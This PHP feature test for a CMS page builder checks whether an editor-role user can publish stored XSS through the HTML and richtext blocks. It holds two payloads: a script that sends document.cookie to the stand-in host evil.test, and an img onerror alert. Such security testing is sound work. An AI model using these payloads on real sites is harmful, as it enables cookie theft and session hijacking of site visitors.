<?php

namespace Tests\Feature;

use App\Cms\Builder\LayoutRenderer;
use App\Models\Layout;
use App\Models\Page;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

/**
 * HtmlBlock's docblock states: "Only administrators can place one."
 * TextBlock/AccordionBlock take richtext that is rendered unescaped.
 * These check whether either claim is enforced on the save path.
 */
class BuilderXssTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->get('/admin'); // burn the first request (stale base path)
    }

    private function editor(): User
    {
        return User::create([
            'name' => 'Ed', 'email' => 'ed@x.test', 'password' => Hash::make('password123'),
            'role' => User::ROLE_EDITOR, 'status' => 'active', 'email_verified_at' => now(),
        ]);
    }

    private function tree(string $type, array $settings): array
    {
        return [[
            'type' => 'section', 'id' => 's1', 'settings' => [],
            'elements' => [[
                'type' => 'column', 'id' => 'c1', 'settings' => [],
                'elements' => [[
                    'type' => 'widget', 'id' => 'w1',
                    'widgetType' => $type, 'settings' => $settings,
                ]],
            ]],
        ]];
    }

    public function test_editor_cannot_publish_a_raw_html_block(): void
    {
        $page = Page::create(['title' => 'T', 'slug' => 't-'.uniqid(), 'status' => 'published']);
        $layout = Layout::create([
            'layoutable_type' => Page::class, 'layoutable_id' => $page->id,
            'theme_slug' => 'default', 'is_enabled' => true,
        ]);

        $payload = '<script>fetch("https://evil.test/?c="+document.cookie)</script>';

        $res = $this->actingAs($this->editor())
            ->postJson('/admin/builder/'.$layout->id.'/publish', [
                'tree' => $this->tree('html', ['html' => $payload]),
            ]);

        $rendered = app(LayoutRenderer::class)->render($layout->fresh()->data ?? []);

        $this->assertStringNotContainsString(
            '<script>fetch(',
            $rendered,
            "An EDITOR published a raw <script> via the builder's HTML block (publish returned HTTP {$res->status()}). Rendered output:\n".trim($rendered)
        );
    }

    public function test_editor_cannot_publish_script_through_a_text_block(): void
    {
        $page = Page::create(['title' => 'T2', 'slug' => 't2-'.uniqid(), 'status' => 'published']);
        $layout = Layout::create([
            'layoutable_type' => Page::class, 'layoutable_id' => $page->id,
            'theme_slug' => 'default', 'is_enabled' => true,
        ]);

        $payload = '<p>hi</p><img src=x onerror="alert(document.domain)">';

        $res = $this->actingAs($this->editor())
            ->postJson('/admin/builder/'.$layout->id.'/publish', [
                'tree' => $this->tree('text', ['content' => $payload]),
            ]);

        $rendered = app(LayoutRenderer::class)->render($layout->fresh()->data ?? []);

        $this->assertStringNotContainsString(
            'onerror=',
            $rendered,
            "An EDITOR published an onerror handler via the builder's richtext TEXT block (HTTP {$res->status()}). Rendered output:\n".trim($rendered)
        );
    }
}
